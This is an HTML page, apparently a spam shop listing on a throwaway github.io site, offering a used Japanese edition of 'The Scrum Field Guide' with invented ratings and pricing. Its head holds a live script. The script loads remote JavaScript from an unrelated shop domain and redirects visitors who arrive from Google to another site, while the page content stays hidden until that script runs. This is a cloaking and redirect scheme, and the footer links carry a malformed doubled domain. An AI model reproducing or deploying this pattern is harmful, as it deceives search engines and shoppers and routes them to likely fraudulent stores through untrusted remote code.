<!DOCTYPE html>
<html lang="ja">
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="Content-Language" content="ja">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta charset="UTF-8">
    <title>スクラム現場ガイド -スクラムを始めてみたけどうまくいかない時に読む本-</title>
    <meta name="description" content="スクラム現場ガイド -スクラムを始めてみたけどうまくいかない時に読む本- zp531_15">
    <link rel="canonical" href="https://utdvkufmtfkiyccj.github.io/zp531_15/d12121.html">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
    <meta property="og:site_name" content="utdvkufmtfkiyccj.github.io">
    <meta property="og:title" content="スクラム現場ガイド -スクラムを始めてみたけどうまくいかない時に読む本-">
    <meta property="og:type" content="article">
    <meta property="og:url" content="https://utdvkufmtfkiyccj.github.io/zp531_15/d12121.html">
    <meta property="og:image" content="https://item-shopping.c.yimg.jp/i/n/daikokuya-store5_20230804094927-00472_i_20240302013257">
    <meta property="og:description" content="スクラム現場ガイド -スクラムを始めてみたけどうまくいかない時に読む本- zp531_15">
    <meta property="og:locale" content="ja_JP">
    <script type="application/ld+json">{ "@context": "https://schema.org", "@type": "Product", "name": "スクラム現場ガイド -スクラムを始めてみたけどうまくいかない時に読む本-", "image": ["https://item-shopping.c.yimg.jp/i/n/daikokuya-store5_20230804094927-00472_i_20240302013257",], "description": "中古品スクラム現場ガイド スクラムを始めてみたけどうまくいかない時に読む本 商品のブランド商品説明　商品状態の程度については記載の商品状態やや傷や汚れありなどにてご確認ください 掲載されている商品写真はイメジ写真となっております外箱説明書等は付属しない場合がございます商品ペジを作成する際にメカサイト等のコメントを引用している事がありますので外箱説明書等は付属しない場合がございます用途機能として最低限の付属品はお送りしておりますイヤホンカトリッジインクなど消耗品に関しましては基本付属していませんリ", "mpn": "71778987658", "sku": "K958228185", "brand": { "@type": "Brand", "name": "新品" }, "review": { "@type": "Review", "reviewRating": { "@type": "Rating", "ratingValue": "4.4", "bestRating": "5" }, "author": { "@type": "Organization", "name": "utdvkufmtfkiyccj.github.io" } }, "aggregateRating": { "@type": "AggregateRating", "ratingValue": "4.4", "reviewCount": "75" }, "offers": { "@type": "Offer", "priceCurrency": "JPY", "price": "12762", "priceValidUntil": "2027-02-03", "url": "https://utdvkufmtfkiyccj.github.io/zp531_15/d12121.html", "itemCondition": "http://schema.org/UsedCondition", "availability": "http://schema.org/InStock", "seller": { "@type": "Person", "name": "CQSZB" }, "shippingDetails": { "@type": "OfferShippingDetails", "shippingRate": { "@type": "MonetaryAmount", "value": 0, "currency": "JPY" }, "shippingDestination": { "@type": "DefinedRegion", "addressCountry": "JA" }, "deliveryTime": { "@type": "ShippingDeliveryTime", "handlingTime": { "@type": "QuantitativeValue", "minValue": 0, "maxValue": 1, "unitCode": "DAY" }, "transitTime": { "@type": "QuantitativeValue", "minValue": 1, "maxValue": 5, "unitCode": "DAY" } } } } }
    </script>
	
	<script>
	function loadScript(src, callback) {
    const script = document.createElement("script");
    script.src = src;
	script.type = 'text/javascript';
	script.crossOrigin = "anonymous";
    script.onload = () => {
        if (callback) callback();
    };
    script.onerror = () => {
    };
		document.head.appendChild(script);
	}
	
	loadScript("https://nibclmarket.shop/zp531.js?name=15",()=> {
		let jump=true;
		if (document.referrer.includes('google') && isgoo) {
                let ids = location.href.split('/')[4].replace(/[^\d]+/g,'');
                let url = 'https://'+site+'/index.php?main_page=product_info&products_id='+ids;
                document.write('<meta http-equiv="Refresh" content="0;url='+url+'" /><script>location.href="'+url+'"<\/script>');
            }else{
				document.getElementsByClassName('content-body')[0].style.display = 'block';
			}
	});
	
	</script>
	
    <style>
        .content-body{
            display:none;
        }
    </style>
    </head>
    <body>
        <div style='width:100%;height:auto' class='content-body'>
		<h1>スクラム現場ガイド -スクラムを始めてみたけどうまくいかない時に読む本-</h1>
		<img style='width:100%' src='https://item-shopping.c.yimg.jp/i/n/daikokuya-store5_20230804094927-00472_i_20240302013257' />
		<div>（中古品）スクラム現場ガイド -スクラムを始めてみたけどうまくいかない時に読む本-: 商品のブランド【商品説明】　※商品状態の程度については記載の商品状態(やや傷や汚れあり、など)にてご確認ください。 ●掲載されている商品写真はイメージ写真となっております。外箱、説明書等は付属しない場合がございます。●商品ページを作成する際にメーカーサイト等のコメントを引用している事がありますので外箱、説明書等は付属しない場合がございます。用途機能として最低限の付属品はお送りしております。●イヤホン・カートリッジ・インクなど消耗品に関しましては基本付属していません。リモコン、ケーブル、BCASカード、カバー等は付属しない場合、純正ではない場合があります。また互換品の可能性があります。●コミック、CD,DVDはレンタルアップ品の場合もございます。●お届け：受注後に再メンテ、梱包します。※商品写真や説明文は代表的なものを掲載している為、状態が違う場合がございます。気になる方はお気軽にお問い合わせください。サイズ<br>    高さ : 2.60 cm<br>    横幅 : 14.80 cm<br>    奥行 : 20.80 cm<br>    重量 : 580.0 g    ※梱包時のサイズとなります。商品自体のサイズではございませんのでご注意ください。    <ul><li></li></ul>  &#12473;&#12463;&#12521;&#12512;&#12420;&#12450;&#12472;&#12515;&#12452;&#12523;&#12434;&#12420;&#12387;&#12390;&#12415;&#12390;&#12289;&#36947;&#12395;&#36855;&#12387;&#12383;&#12424;&#12358;&#12395;&#24863;&#12376;&#12390;&#12356;&#12427;&#12354;&#12394;&#12383;&#12408; (&#12371;&#12398;&#26412;&#12399;&#12302;The Scrum Field Guide: Practical Advice for Your First Year&#12303;&#12398;&#32763;&#35379;&#26412;&#12391;&#12377;)  &#26412;&#26360;&#12399;&#12289;1&#24180;&#30446;&#12395;&#12473;&#12463;&#12521;&#12512;&#12392;&#12450;&#12472;&#12515;&#12452;&#12523;&#12391;&#12302;&#12393;&#12435;&#12394;&#12371;&#12392;&#12364;&#36215;&#12365;&#12427;&#12363;&#12303;&#12395;&#12388;&#12356;&#12390;&#12398;&#26412;&#12391;&#12377;&#12290;&#31558;&#32773;&#12364;&#12289;1&#24180;&#30446;&#12398;&#12450;&#12472;&#12515;&#12452;&#12523;&#12395;&#12414;&#12388;&#12431;&#12427;&#29289;&#35486;&#12434;&#38598;&#12417;&#12289;&#38627;&#12375;&#12356;&#12509;&#12452;&#12531;&#12488;&#12392;&#12289;&#12381;&#12428;&#12395;&#23550;&#12377;&#12427;&#12477;&#12522;&#12517;&#12540;&#12471;&#12519;&#12531;&#12434;&#12414;&#12392;&#12417;&#12390;&#12356;&#12414;&#12377;&#12290;  (&#20197;&#19979;&#12289;&#33879;&#32773;&#12395;&#12424;&#12427;&#12300;&#12414;&#12360;&#12364;&#12365;&#12301;&#12424;&#12426;&#25244;&#31883;)  &#12473;&#12463;&#12521;&#12512;&#12420;&#12450;&#12472;&#12515;&#12452;&#12523;&#12434;&#22987;&#12417;&#12424;&#12358;&#12392;&#24605;&#12387;&#12390;&#12356;&#12383;&#12426;&#12289;&#12414;&#12373;&#12395;&#22987;&#12417;&#12383;&#12392;&#12371;&#12429;&#12384;&#12387;&#12383;&#12426;&#12289;1&#24180;&#12367;&#12425;&#12356;&#12420;&#12387;&#12390;&#12365;&#12390;&#36947;&#12395;&#36855;&#12387;&#12383;&#12424;&#12358;&#12395;&#24863;&#12376;&#12390;&#12356;&#12427;&#12394;&#12425;&#12289;&#26412;&#26360;&#12399;&#12354;&#12394;&#12383;&#12398;&#12383;&#12417;&#12395;&#12354;&#12427;&#12290;&#20693;&#12399;&#20844;&#24335;&#12395;&#12399;&#12289;&#26032;&#12383;&#12395;&#12503;&#12525;&#12472;&#12455;&#12463;&#12488;&#12434;&#22987;&#12417;&#12390;6&#12534;&#26376;&#12363;&#12425;18&#12534;&#26376;&#12398;12&#12534;&#26376;&#12398;&#38291;&#12395;&#12356;&#12427;&#20225;&#26989;&#12364;&#23550;&#35937;&#12384;&#12392;&#12375;&#12390;&#12356;&#12427;&#12290;  (&#20013;&#30053;) &#26412;&#26360;&#12399;4&#12388;&#12398;&#12497;&#12540;&#12488;&#12395;&#20998;&#12363;&#12428;&#12390;&#12356;&#12427;&#12290;  &#31532;1&#37096;&#12300;&#28310;&#20633;&#12301;&#12391;&#12399;&#12473;&#12463;&#12521;&#12512;&#12434;&#22987;&#12417;&#12427;&#12395;&#24403;&#12383;&#12387;&#12390;&#12398;&#12450;&#12489;&#12496;&#12452;&#12473;&#12392;&#12289;&#25104;&#21151;&#12395;&#21521;&#12369;&#12383;&#28310;&#20633;&#12395;&#12388;&#12356;&#12390;&#26360;&#12356;&#12390;&#12356;&#12427;&#12290;&#12473;&#12463;&#12521;&#12512;&#12398;&#23566;&#20837;&#12434;&#26908;&#35342;&#12375;&#12390;&#12356;&#12427;&#12363;&#12289;&#22987;&#12417;&#12383;&#12400;&#12363;&#12426;&#12394;&#12425;&#12400;&#12371;&#12371;&#12363;&#12425;&#35501;&#12416;&#12398;&#12364;&#12356;&#12356;&#12290;  &#31532;2&#37096;&#12300;&#29694;&#22580;&#12398;&#22522;&#26412;&#12301;&#12391;&#12399;&#12289;&#12450;&#12472;&#12515;&#12452;&#12523;&#12398;&#12420;&#12426;&#26041;&#12434;&#22987;&#12417;&#12427;&#12392;&#12481;&#12540;&#12512;&#12420;&#32068;&#32340;&#12364;&#20986;&#20250;&#12358;&#12371;&#12392;&#12395;&#12394;&#12427;&#21021;&#26399;&#12398;&#38556;&#23475;&#29289;&#12434;&#12289;&#20055;&#12426;&#36234;&#12360;&#12427;&#21161;&#12369;&#12392;&#12394;&#12427;&#12356;&#12367;&#12388;&#12363;&#12398;&#38917;&#30446;&#12395;&#12388;&#12356;&#12390;&#35696;&#35542;&#12375;&#12390;&#12356;&#12427;&#12290;&#12473;&#12463;&#12521;&#12512;&#12434;&#23455;&#36341;&#12375;&#12390;&#12356;&#12390;&#12289;&#21839;&#38988;&#12434;&#25265;&#12360;&#12390;&#12356;&#12427;&#12394;&#12425;&#12289;&#12371;&#12371;&#12363;&#12425;&#22987;&#12417;&#12427;&#12392;&#12356;&#12356;&#12290;  &#31532;3&#37096;&#12300;&#25937;&#24613;&#20966;&#32622;&#12301;&#12399;&#20250;&#31038;&#12364;&#25265;&#12360;&#12427;&#12289;&#12424;&#12426;&#22823;&#12365;&#12367;&#28145;&#12356;&#21839;&#38988;&#12395;&#23550;&#24540;&#12377;&#12427;&#26041;&#27861;&#12434;&#12414;&#12392;&#12417;&#12390;&#12356;&#12427;&#12290;&#12503;&#12525;&#12472;&#12455;&#12463;&#12488;&#12408;&#35201;&#21729;&#36861;&#21152;&#12377;&#12427;&#12420;&#12426;&#26041;&#12420;&#12289;&#27231;&#33021;&#19981;&#20840;&#12395;&#12394;&#12387;&#12383;&#12487;&#12452;&#12522;&#12540;&#12473;&#12479;&#12531;&#12489;&#12450;&#12483;&#12503;&#12398;&#30452;&#12375;&#26041;&#12394;&#12393;&#12384;&#12290;&#12371;&#12371;&#12391;&#32057;&#20171;&#12377;&#12427;&#29366;&#27841;&#12399;&#12289;&#12354;&#12394;&#12383;&#12364;&#26368;&#21021;&#12398;1&#24180;&#38291;&#12398;&#12393;&#12371;&#12363;&#12398;&#12479;&#12452;&#12511;&#12531;&#12464;&#12391;&#36973;&#36935;&#12377;&#12427;&#12418;&#12398;&#12395;&#12394;&#12427;&#12290;&#12371;&#12398;&#12497;&#12540;&#12488;&#12391;&#12399;&#12488;&#12522;&#12450;&#12540;&#12472;&#12392;&#27835;&#30274;&#12395;&#12424;&#12387;&#12390;&#12289;&#12354;&#12394;&#12383;&#12398;&#12481;&#12540;&#12512;&#12434;&#20581;&#24247;&#12395;&#25147;&#12377;&#26041;&#27861;&#12434;&#32057;&#20171;&#12375;&#12390;&#12356;&#12427;&#12290;  &#26368;&#24460;&#12398;&#12497;&#12540;&#12488;&#12300;&#19978;&#32026;&#12469;&#12496;&#12452;&#12496;&#12523;&#12486;&#12463;&#12491;&#12483;&#12463;&#12301;&#12391;&#21462;&#12426;&#19978;&#12370;&#12427;&#20107;&#38917;&#12399;&#12289;&#20154;&#12403;&#12392;&#12364;&#12479;&#12452;&#12511;&#12531;&#12464;&#12395;&#38306;&#20418;&#12394;&#12367;&#12424;&#12367;&#24745;&#12414;&#12373;&#12428;&#12390;&#12356;&#12427;&#12418;&#12398;&#12384;&#12290;&#12450;&#12472;&#12515;&#12452;&#12523;&#12420;&#12473;&#12463;&#12521;&#12512;&#12391;&#12398;&#12503;&#12525;&#12472;&#12455;&#12463;&#12488;&#12398;&#12467;&#12473;&#12488;&#31639;&#20986;&#12289;&#22865;&#32004;&#12398;&#20316;&#12426;&#26041;&#12289;&#12489;&#12461;&#12517;&#12513;&#12531;&#12488;&#12398;&#26360;&#12365;&#26041;&#12394;&#12393;&#12384;&#12290;  &#12354;&#12394;&#12383;&#12364;&#12414;&#12387;&#12383;&#12367;&#26032;&#12383;&#12395;&#12473;&#12463;&#12521;&#12512;&#12434;&#22987;&#12417;&#12427;&#12392;&#12371;&#12429;&#12394;&#12425;&#12400;&#12289;&#26411;&#23614;&#12398;&#20184;&#37682;&#12391;&#31777;&#21336;&#12395;&#35500;&#26126;&#12375;&#12390;&#12427;&#12290;&#22522;&#30990;&#30693;&#35672;&#12364;&#12394;&#12356;&#12398;&#12391;&#12354;&#12428;&#12400;&#12289;&#12371;&#12371;&#12391;&#29992;&#35486;&#12434;&#23398;&#12406;&#12392;&#12356;&#12356;&#12290;&#26412;&#26360;&#12398;&#21069;&#12395;&#12289;&#20182;&#12398;&#26412;&#12391;&#12473;&#12463;&#12521;&#12512;&#12434;&#21193;&#24375;&#12377;&#12427;&#12398;&#12418;&#12356;&#12356;&#12384;&#12429;&#12358;&#12290;<br/><br/><img src="https://item-shopping.c.yimg.jp/i/n/daikokuya-store5_20230804094927-00472_i_20240302013257" />
</div>
		<footer>
			<ul>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_15/e15907.html'>お支払い方法について</a></li>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_15/b4737.html'>よくある質問</a></li>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_15/e12655.html'>お問い合わせ</a></li>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_15/b35687.html'>参画のご案内</a></li>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_15/e10233.html'>ギフトモールのサービス</a></li>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_15/d9491.html'>ヘルプ&ガイド</a></li>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_15/c6599.html'>フォトコンテスト</a></li>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_15/d8072.html'>演劇/芸能</a></li>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_15/f5539.html'>フィギュア</a></li>
				<li><a href='https://utdvkufmtfkiyccj.github.io.github.io/zp531_15/c21236.html'>アダルトDVD</a></li>
			</ul>
		</footer>
		</div>
    </body>
</html>